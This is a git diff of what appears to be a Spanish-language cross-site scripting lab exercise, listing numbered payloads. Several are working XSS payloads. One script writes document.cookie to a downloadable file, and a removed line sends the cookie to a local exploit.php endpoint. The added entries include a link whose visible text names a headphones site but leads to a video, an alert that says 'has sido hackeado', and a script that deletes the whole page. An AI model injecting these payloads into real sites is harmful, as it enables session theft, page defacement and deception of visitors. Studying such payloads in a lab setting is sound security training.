@@ -30,7 +30,7 @@ document.location.replace('https://en.wikipedia.org/wiki/Cross-site_scripting')
 codificado:
 %3C%73%63%72%69%70%74%3E%0A%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%2E%72%65%70%6C%61%63%65%28%27%68%74%74%70%73%3A%2F%2F%65%6E%2E%77%69%6B%69%70%65%64%69%61%2E%6F%72%67%2F%77%69%6B%69%2F%43%72%6F%73%73%2D%73%69%74%65%5F%73%63%72%69%70%74%69%6E%67%27%29%0A%3C%2F%73%63%72%69%70%74%3E
 
-6-1:
+6:
 <script>
 function saveCookie(cookie) {
 var blob = new Blob([cookie], { type: 'text/plain'});
@@ -44,8 +44,11 @@ URL.revokeObjectURL(url);
 saveCookie(document.cookie);
 </script>
 
-6-2:
-<p>Confia en mi</p><script src='http://localhost/Practica03/exploit.php?cookie='+document.cookie></script>
-
 7:
-%3Cscript%3E+++++window.location.replace%28%27https%3A%2F%2Fyoutu.be%2FdQw4w9WgXcQ%3Ft%3D49%27%29%3B+%3C%2Fscript%3E
+<p> Checa estos audifonos: <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ"> https://www.headphpnesultra.com/ </a>
+
+8:
+<script>alert("has sido hackeado");</script>
+
+9: 
+<script>document.getElementsByTagName('html')[0].remove();</script>
